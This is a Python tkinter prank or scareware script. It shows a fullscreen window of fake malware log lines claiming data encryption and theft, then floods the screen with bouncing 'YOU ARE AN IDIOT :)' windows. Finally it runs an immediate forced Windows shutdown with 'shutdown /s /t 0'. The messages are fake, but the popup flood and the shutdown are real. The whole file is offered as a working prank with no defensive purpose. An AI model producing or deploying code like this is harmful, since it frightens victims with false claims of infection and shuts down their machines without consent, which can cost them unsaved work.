import tkinter as tk
import random
import threading
import time
import os

def create_bouncing_window():
    root = tk.Tk()
    root.title("YOU ARE AN IDIOT :)")
    root.geometry("200x100")
    root.attributes("-topmost", True)

    window_width = 200
    window_height = 100
    screen_width = root.winfo_screenwidth()
    screen_height = root.winfo_screenheight()

    dx = random.choice([-5, 5])
    dy = random.choice([-5, 5])

    def move_window():
        nonlocal dx, dy
        x, y = root.winfo_x(), root.winfo_y()
        if x + dx < 0 or x + dx > screen_width - window_width:
            dx = -dx
        if y + dy < 0 or y + dy > screen_height - window_height:
            dy = -dy
        root.geometry(f"+{x + dx}+{y + dy}")
        root.after(10, move_window)

    label = tk.Label(root, text="YOU ARE AN IDIOT :)", font=("Arial", 14))
    label.pack(expand=True)

    root.after(10, move_window)
    root.mainloop()

def show_logs():
    log_window = tk.Tk()
    log_window.title("System Logs")
    log_window.attributes("-fullscreen", True)
    log_text = tk.Text(log_window, font=("Arial", 10), bg="black", fg="green")
    log_text.pack(expand=True, fill='both')

    logs = [
        "Virus is up and running...",
        "Scanning system files...",
        "Encrypting data...",
        "Disabling security protocols...",
        "Uploading sensitive information...",
        "System takeover in progress..."
    ]

    for log in logs:
        log_text.insert(tk.END, f"MAL:/>> {log}\n")
        log_window.update()
        time.sleep(1)

    # Automatically close the log window after displaying all logs
    log_window.after(1000, log_window.destroy)
    log_window.mainloop()

def start_popups():
    # Continuously create bouncing windows
    start_time = time.time()
    duration = 10  # Run pop-ups for 10 seconds
    while time.time() - start_time < duration:
        threading.Thread(target=create_bouncing_window).start()
        time.sleep(0.1)

    # Shutdown the PC after pop-ups
    os.system("shutdown /s /t 0")

def main():
    # Start the log window
    show_logs()

    # Start popups after logs are shown
    start_popups()

if __name__ == "__main__":
    main()
